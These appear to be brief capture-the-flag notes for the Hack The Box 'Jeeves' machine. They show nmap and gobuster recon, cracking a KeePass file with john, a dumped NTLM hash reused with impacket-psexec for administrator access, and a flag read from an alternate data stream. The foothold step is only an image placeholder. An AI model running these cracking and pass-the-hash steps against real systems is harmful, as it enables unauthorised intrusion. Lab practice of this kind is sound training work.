# recon
```
└─$ nmap -sVC -T4 10.129.1.181 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 19:53 GMT
Nmap scan report for 10.129.1.181 (10.129.1.181)
Host is up (0.094s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-27T00:53:33
|_  start_date: 2024-04-27T00:47:45
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

```
gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.1.181:50000 
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.1.181:50000/askjeeves/]

```

# foothold
![[Pasted image 20240426204551.png]]

'>'

# privesc
```
└─$ keepass2john CEH.kdbx > hash     
                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chall/htb]
└─$  john hash -wordlist=/usr/share/wordlists/rockyou.txt                           
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)  
```

```
kpcli --kdb=CEH.kdbx
```

```
kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn

kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 
```

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.1.181

```
flux de données alternatif
```
dir /R
more < hm.txt:root.txt
```